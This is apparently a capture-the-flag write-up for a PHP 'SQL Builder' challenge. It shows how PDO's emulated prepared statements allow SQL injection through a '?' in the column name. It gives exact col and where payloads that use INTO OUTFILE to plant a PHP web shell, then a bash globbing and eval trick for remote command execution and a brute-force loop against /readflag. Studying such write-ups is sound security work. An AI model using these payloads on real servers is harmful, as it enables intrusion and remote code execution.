# SQL Builder (by @Alemmi)

## Challenge 
The challenge consists of a single PHP file with a simple SQL builder implementation.
The script accepts two query parameters:
- col
- where

Then the script performs a prepared statement:
```sql
SELECT $col FROM users WHERE explode(':',$where)[0] = explode(':',$where)[1]....;
```

To read the flag, the attacker must execute the /readflag binary and interact with it.

## The bug

By default, PHP 8 with PDO simulates prepared statements (unless `PDO::ATTR_EMULATE_PREPARES` is disabled).

So, placing a `?` in `$col` actually breaks the SQL syntax.

Read more [here](https://slcyber.io/assetnote-security-research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/)

## From sql injection to RCE

### Idea

With `MYSQL (mariadb)` you can use `INTO OUTFILE 'path'` to write arbitrary content in arbitrary file.

This makes it possible to write a PHP file into `/var/www/html` and gain full control of the system.

### Some problem

- There is a maximum length requirement on the GET parameters, so we cannot simply write a full PHP script.
- With the previous technique we “cannot” directly use `'` in the injection.

### Fix for `'`

Each `?` will be substituted with `$arg` by PDO, and all `'` will be escaped. 
So the file path must be inserted directly into `$col`, and the second parameter must be used to close the final `'`.

```php
$col = "\\?\\?/var/www/html/z.php';--\x00";
$where = "id:`FROM(SELECT 0x3f AS`'`)`,name:`INTO OUTFILE";
```

The query before substitution is:
```sql
SELECT `??/var/www/html/z.php';--\0` FROM users [...]
```

Then the first parameter is applied (note the `'` around it):

```sql
SELECT `'` FROM(SELECT 0x3f AS`'`)`'?/var/www/html/z.php';--\0` FROM users [...]
```

Finally the second parameter is applied:

```sql
SELECT `'` FROM(SELECT 0x3f AS`'`)`'`INTO OUTFILE'/var/www/html/z.php';-- \0  [...]
```

This is valid SQL syntax.

The query writes a single `?` into `z.php`. At this point, we have arbitrary file write with arbitrary file names.

### RCE

Because of the length restriction, we cannot write a full PHP script, but we have enough space for:

```php
<?=`*`?>
```

This code executes the `*` command in bash. With globbing, bash expands `*` to all files in the current directory and runs them as a command (in ASCII order). For example:

```
$ ls
.
..
cat
user.php
$ *
[content of user.php]
```

Using this trick, we can build arbitrary bash commands.. By leveraging `eval` and environment variables, we can chain commands:

```
$ ls
.
..
eval
$ff=...
$fg=$ff..
$fh=$fg..
[..]
$g=eval $fh
sh -c "\$fh";
user.php   <- the challenge
z.php      <- <?=`*`?>
```
Now we can trigger RCE:
```bash
curl http://CHALLENGE/z.php  # RCE
```

From here, we can establish a reverse shell to run `/readflag`.

Alternatively, since `/dev/urandom` may produce `NULL` bytes and the string compare stop checking at the first `NULL` byte, we can write a simple loop:

```bash
RET=1
COUNT=0
while [ $RET -ne 0 ]; do
    printf '\\0\\n\\0\\n' | timeout 2 /readflag 2>&1
    RET=$?
    COUNT=$((COUNT + 1))
    echo "Attempt number: $COUNT"
done
echo "[+] Found flag!"
```

